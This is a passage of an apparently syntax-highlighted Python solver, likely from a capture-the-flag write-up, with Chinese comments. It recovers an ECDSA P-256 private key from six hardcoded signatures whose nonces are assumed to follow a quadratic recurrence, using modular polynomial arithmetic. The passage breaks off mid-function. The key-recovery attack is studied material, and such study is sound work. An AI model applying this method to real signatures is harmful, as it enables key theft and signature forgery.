</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ecdsa</span> <span class=kn>import</span> <span class=n>NIST256p</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>defaultdict</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mod_inverse</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    计算 a 模 m 的乘法逆元。
</span></span></span><span class=line><span class=cl><span class=s2>    使用扩展欧几里得算法。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>g</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=o>=</span> <span class=n>egcd</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>g</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;modular inverse does not exist&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>egcd</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    扩展欧几里得算法。
</span></span></span><span class=line><span class=cl><span class=s2>    返回 g, x, y 使得 a*x + b*y = g = gcd(a, b)。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>a</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>g</span><span class=p>,</span> <span class=n>y</span><span class=p>,</span> <span class=n>x</span> <span class=o>=</span> <span class=n>egcd</span><span class=p>(</span><span class=n>b</span> <span class=o>%</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>g</span><span class=p>,</span> <span class=n>x</span> <span class=o>-</span> <span class=p>(</span><span class=n>b</span> <span class=o>//</span> <span class=n>a</span><span class=p>)</span> <span class=o>*</span> <span class=n>y</span><span class=p>,</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>clean_poly</span><span class=p>(</span><span class=n>p</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    移除多项式列表开头多余的零，使其规范化。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>p</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>idx</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>p</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>p</span><span class=p>[</span><span class=n>idx</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>poly_add</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    将两个多项式 p1 和 p2 相加，模 m。
</span></span></span><span class=line><span class=cl><span class=s2>    多项式表示为系数列表，从最高次幂到最低次幂。
</span></span></span><span class=line><span class=cl><span class=s2>    例如，[a, b, c] 代表 ax^2 + bx + c。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>d1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>d2</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>p2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=nb>max</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=n>d2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>d1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=nb>max</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=n>d2</span><span class=p>)</span> <span class=o>-</span> <span class=n>d1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>p1</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>res</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=nb>max</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=n>d2</span><span class=p>)</span> <span class=o>-</span> <span class=n>d1</span><span class=p>])</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>d2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=nb>max</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=n>d2</span><span class=p>)</span> <span class=o>-</span> <span class=n>d2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>p2</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>res</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=nb>max</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=n>d2</span><span class=p>)</span> <span class=o>-</span> <span class=n>d2</span><span class=p>])</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>clean_poly</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>poly_sub</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    将多项式 p2 从 p1 中减去，模 m。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>d1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>d2</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>p2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>d1</span> <span class=o>&lt;</span> <span class=n>d2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=n>d2</span> <span class=o>-</span> <span class=n>d1</span><span class=p>)</span> <span class=o>+</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>d2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>res</span><span class=p>)</span> <span class=o>-</span> <span class=n>d2</span> <span class=o>+</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>res</span><span class=p>)</span> <span class=o>-</span> <span class=n>d2</span> <span class=o>+</span> <span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=n>p2</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>m</span><span class=p>)</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>clean_poly</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>poly_mul</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    将两个多项式 p1 和 p2 相乘，模 m。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>d1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>d2</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>p2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=n>d1</span> <span class=o>+</span> <span class=n>d2</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>d1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>d2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>+</span> <span class=n>p1</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*</span> <span class=n>p2</span><span class=p>[</span><span class=n>j</span><span class=p>])</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>clean_poly</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>poly_div</span><span class=p>(</span><span class=n>dividend</span><span class=p>,</span> <span class=n>divisor</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    执行多项式除法（带余数），模 m。
</span></span></span><span class=line><span class=cl><span class=s2>    返回 (商, 余数)。
</span></span></span><span class=line><span class=cl><span class=s2>    假定除数的最高次系数是可逆的。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>dividend</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>dividend</span><span class=p>)</span>  <span class=c1># 复制以避免修改原始列表</span>
</span></span><span class=line><span class=cl>    <span class=n>divisor</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>divisor</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dividend</span> <span class=o>=</span> <span class=n>clean_poly</span><span class=p>(</span><span class=n>dividend</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>divisor</span> <span class=o>=</span> <span class=n>clean_poly</span><span class=p>(</span><span class=n>divisor</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>deg_dend</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>dividend</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>deg_div</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>divisor</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>deg_div</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;Divisor cannot be a zero polynomial&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>deg_div</span> <span class=o>&gt;</span> <span class=n>deg_dend</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>dividend</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>lc_div</span> <span class=o>=</span> <span class=n>divisor</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>lc_inv</span> <span class=o>=</span> <span class=n>mod_inverse</span><span class=p>(</span><span class=n>lc_div</span><span class=p>,</span> <span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>quotient</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=n>deg_dend</span> <span class=o>-</span> <span class=n>deg_div</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>remainder</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>dividend</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>deg_dend</span> <span class=o>-</span> <span class=n>deg_div</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 得到当前余数的最高次系数</span>
</span></span><span class=line><span class=cl>        <span class=n>lc_rem</span> <span class=o>=</span> <span class=n>remainder</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 计算商的当前项</span>
</span></span><span class=line><span class=cl>        <span class=n>q_term</span> <span class=o>=</span> <span class=p>(</span><span class=n>lc_rem</span> <span class=o>*</span> <span class=n>lc_inv</span><span class=p>)</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>        <span class=n>quotient</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>q_term</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 从余数中减去除数乘以商项的结果</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>deg_div</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>term</span> <span class=o>=</span> <span class=p>(</span><span class=n>q_term</span> <span class=o>*</span> <span class=n>divisor</span><span class=p>[</span><span class=n>j</span><span class=p>])</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>            <span class=n>remainder</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>remainder</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>-</span> <span class=n>term</span> <span class=o>+</span> <span class=n>m</span><span class=p>)</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 规范化商和余数</span>
</span></span><span class=line><span class=cl>    <span class=n>remainder</span> <span class=o>=</span> <span class=n>clean_poly</span><span class=p>(</span><span class=n>remainder</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>quotient</span><span class=p>):])</span>
</span></span><span class=line><span class=cl>    <span class=n>quotient</span> <span class=o>=</span> <span class=n>clean_poly</span><span class=p>(</span><span class=n>quotient</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>quotient</span><span class=p>,</span> <span class=n>remainder</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>poly_gcd</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    使用欧几里得算法计算两个多项式在 Z_m 上的 GCD。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>p1</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>p2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>any</span><span class=p>(</span><span class=n>x</span> <span class=o>!=</span> <span class=mi>0</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>_</span><span class=p>,</span> <span class=n>r</span> <span class=o>=</span> <span class=n>poly_div</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 规范化多项式，使最高次系数为 1</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>x</span> <span class=o>!=</span> <span class=mi>0</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>lc_inv</span> <span class=o>=</span> <span class=n>mod_inverse</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=p>[(</span><span class=n>x</span> <span class=o>*</span> <span class=n>lc_inv</span><span class=p>)</span> <span class=o>%</span> <span class=n>m</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>a</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># 1. 定义曲线和阶数</span>
</span></span><span class=line><span class=cl>    <span class=n>curve</span> <span class=o>=</span> <span class=n>NIST256p</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>curve</span><span class=o>.</span><span class=n>order</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2. 解析 signatures.txt</span>
</span></span><span class=line><span class=cl>    <span class=n>h_values</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>r_values</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>s_values</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 使用提供的文件内容</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;h: 5832921593739954772384341732387581797486339670895875430934592373351528180781, r: 78576287416983546819312440403592484606132915965726128924031253623117138586396, s: 108582979377193966287732302562639670357586761346333866965382465209612237330851
</span></span></span><span class=line><span class=cl><span class=s2>h: 85517239535736342992982496475440962888226294744294285419613128065975843025446, r: 60425040031360920373082268221766168683222476464343035165195057634060216692194, s: 27924509924269609509672965613674355269361001011362007412205784446375567959036
</span></span></span><span class=line><span class=cl><span class=s2>h: 90905761421138489726836357279787648991884324454425734512085180879013704399530, r: 75779605492148881737630918749717271960050893072832415117470852442721700807111, s: 72740499400319841565890543635298470075267336863033867770902108413176557795256
</span></span></span><span class=line><span class=cl><span class=s2>h: 103266614372002123398101167242562044737358751274736728792365384600377408313142, r: 89519601474973769723244654516140957004170211982048028366151899055366457476708, s: 23639647021855356876198750083669161995553646511611903128486429649329358343588
</span></span></span><span class=line><span class=cl><span class=s2>h: 9903460667647154866199928325987868915846235162578615698288214703794150057571, r: 17829304522948160053211214227664982869100868125268116260967204562276608388692, s: 74400189461172040580877095515356365992183768921088660926738652857846750009205
</span></span></span><span class=line><span class=cl><span class=s2>h: 54539896686295066164943194401294833445622227965487949234393615233511802974126, r: 66428683990399093855578572760918582937085121375887639383221629490465838706027, s: 25418035697368269779911580792368595733749376383350120613502399678197333473802
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>lines</span> <span class=o>=</span> <span class=n>content</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>parts</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>h</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>parts</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>parts</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>parts</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>h_values</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r_values</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s_values</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3. 将 k_i 表示为关于 d 的线性多项式</span>
</span></span><span class=line><span class=cl>    <span class=n>k_polys</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>s_inv</span> <span class=o>=</span> <span class=n>mod_inverse</span><span class=p>(</span><span class=n>s_values</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>A</span> <span class=o>=</span> <span class=p>(</span><span class=n>h_values</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*</span> <span class=n>s_inv</span><span class=p>)</span> <span class=o>%</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>        <span class=n>B</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_values</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*</span> <span class=n>s_inv</span><span class=p>)</span> <span class=o>%</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>        <span class=c1># [B, A] 代表 B*d + A</span>
</span></span><span class=line><span class=cl>        <span class=n>k_polys</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>B</span><span class=p>,</span> <span class=n>A</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 4. 从递推关系中构造多项式方程</span>
</span></span><span class=line><span class=cl>    <span class=c1># 递推关系为：k_{i+1} = a*k_i^2 + b*k_i + c</span>
</span></span><span class=line><span class=cl>    <span class=c1># 通过消去 a, b, c，我们可以得到一个只依赖于 d 的多项式方程</span>
</span></span><span class=line><span class=cl>    <span class=c1># 方程形式为: a(k_2-k_0)(k_2-k_1)(k_1-k_0) = (k_3-k_2)(k_1-k_0) - (k_2-k_1)^2</span>
</span></span><span class=line><span class=cl>    <span class=c1># 我们将左边和右边分别表示为关于 d 的多项式，并使用两组不同的 k 值来得到两个多项式方程。</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_poly_for_a_numerator</span><span class=p>(</span><span class=n>k_p0</span><span class=p>,</span> <span class=n>k_p1</span><span class=p>,</span> <span class=n>k_p2</span><span class=p>,</span> <span class=n>k_p3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 分子: (k_3 - k_2)*(k_1 - k_0) - (k_2 - k_1)^2</span>
</span></span><span class=line><span class=cl>        <span class=n>p32</span> <span class=o>=</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>k_p3</span><span class=p>,</span> <span class=n>k_p2</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p10</span> <span class=o>=</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>k_p1</span><span class=p>,</span> <span class=n>k_p0</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p21</span> <span class=o>=</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>k_p2</span><span class=p>,</span> <span class=n>k_p1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>num_part1</span> <span class=o>=</span> <span class=n>poly_mul</span><span class=p>(</span><span class=n>p32</span><span class=p>,</span> <span class=n>p10</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
